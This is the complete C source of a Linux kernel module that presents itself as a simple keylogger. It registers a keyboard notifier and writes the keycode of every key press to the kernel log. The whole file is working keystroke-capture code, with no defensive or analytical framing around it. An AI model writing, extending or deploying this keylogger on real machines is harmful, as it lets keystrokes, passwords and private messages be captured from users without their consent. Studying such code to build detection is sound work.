#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("A simple keylogger kernel module.");

static struct notifier_block nb;

static int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    // We are only interested in key down events
    if (code == KBD_KEYCODE && param->down) {
        printk(KERN_INFO "Keylogger: keycode %d\n", param->value);
    }

    return NOTIFY_OK;
}

static int __init keylogger_init(void) {
    nb.notifier_call = keyboard_notifier_callback;
    register_keyboard_notifier(&nb);
    printk(KERN_INFO "Keylogger module loaded.\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "Keylogger module unloaded.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

